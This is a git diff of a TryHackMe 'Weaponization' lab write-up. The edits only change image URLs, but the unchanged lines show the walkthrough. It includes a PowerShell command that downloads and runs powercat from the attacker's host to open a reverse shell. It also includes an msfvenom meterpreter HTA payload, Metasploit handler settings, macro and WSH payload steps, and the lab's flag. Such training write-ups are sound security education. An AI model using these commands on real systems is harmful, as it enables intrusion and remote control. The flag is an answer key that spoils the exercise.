@@ -1,7 +1,7 @@
-![Weaponization Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Banner.png)
+![Weaponization Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Banner.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Cover.png" alt="Weaponization Logo">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Cover.png" alt="Weaponization Logo">
 </p>
 
 # Weaponization
@@ -23,7 +23,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
 
    I tried the message box using cscript which seemed to work.
    
-   ![Hello](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_Hello.png)
+   ![Hello](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_WSH_Hello.png)
 
    When trying the open cmd.exe with the vbs file, I ran into an issue where it just wouldn't open a command prompt. So I had to modify the code slightly for it to work.
    
@@ -32,7 +32,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
    ```
    
-   ![CMB VBS](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_CMD_VBS.png)
+   ![CMB VBS](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_WSH_CMD_VBS.png)
    
    It also worked when saving the vbs file as a text file and using the `/e` argument.
    
@@ -40,7 +40,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    cscript /e:VBScript c:\Users\thm\Desktop\payload.txt
    ```
    
-   ![CMD TXT](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_CMD_TXT.png)
+   ![CMD TXT](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_WSH_CMD_TXT.png)
 
    ><details><summary>Click for answer</summary>No Answer Needed</details>
 
@@ -63,7 +63,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    exploit
    ```
    
-   ![Metasploit Module Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_HTA_Metasploit_Module_Run.png)
+   ![Metasploit Module Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_HTA_Metasploit_Module_Run.png)
    
    As seen in the image above, we managed to get a reverse connection back.
 
@@ -81,7 +81,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    
    Now I could copy this macro into a Word document on the target machine.
    
-   ![Macro](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_VBA_Macro.png)
+   ![Macro](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_VBA_Macro.png)
    
    Save it as a word 97 document so the macros are enabled. Close Word.
    
@@ -97,7 +97,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    
    Now we can open the newly created Word document with our payload inside.
    
-   ![Metasploit Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_VBA_Metasploit_Run.png)
+   ![Metasploit Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_VBA_Metasploit_Run.png)
    
    ><details><summary>Click for answer</summary>No Answer Needed</details>
 
@@ -111,7 +111,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    git clone https://github.com/besimorhino/powercat.git
    ```
    
-   ![Git Clone](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Git_Clone.png)
+   ![Git Clone](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_PSH_Git_Clone.png)
    
    Next we set up a server in the Powercat folder and a listener on the specified port.
    
@@ -128,7 +128,7 @@ This guide contains the answer and steps necessary to get to them for the [Weapo
    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.18.78.136:8080/powercat.ps1');powercat -c 10.18.78.136 -p 1337 -e cmd"
    ```
    
-   ![Powercat Reverse](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Powercat_Reverse.png)
+   ![Powercat Reverse](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_PSH_Powercat_Reverse.png)
    
    ><details><summary>Click for answer</summary>No Answer Needed</details>
 
@@ -152,7 +152,7 @@ In this task we will use what we have learned and try to gain access to the targ
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f hta-psh -o letmein.hta
    ```
    
-   ![Payload Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Payload_Creation.png)
+   ![Payload Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Practical_Payload_Creation.png)
    
    Then we need to setup a listener, which we can do with MetaSploit. Don't forget to set the required options.
    
@@ -164,7 +164,7 @@ In this task we will use what we have learned and try to gain access to the targ
    set payload windows/meterpreter/reverse_tcp
    ```
    
-   ![Metasploit Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Metasploit_Handler.png)
+   ![Metasploit Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Practical_Metasploit_Handler.png)
    
    Lastly, we need to setup a server in the same folder as the payload.
    
@@ -174,7 +174,7 @@ In this task we will use what we have learned and try to gain access to the targ
    
    Now we can navigate to the web application and supply the url provided by the MetaSploit handler.
    
-   ![Web Application](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Web_Application.png)
+   ![Web Application](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Practical_Web_Application.png)
    
    We can see we successfully captured the reverse connection in MetaSploit. Although maybe not necessary when using this method, I also wanted to migrate our process to another. For this we can use the following command in MetaSploit:
    
@@ -182,10 +182,10 @@ In this task we will use what we have learned and try to gain access to the targ
    run post/windows/manage/migrate
    ```
    
-   ![Migrate Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Migrate_Check.png)
+   ![Migrate Check](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Practical_Migrate_Check.png)
    
    Finally, we can look for the flag on the system.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/weaponization/Weaponization_Practical_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{b4dbc2f16afdfe9579030a929b799719}</details>
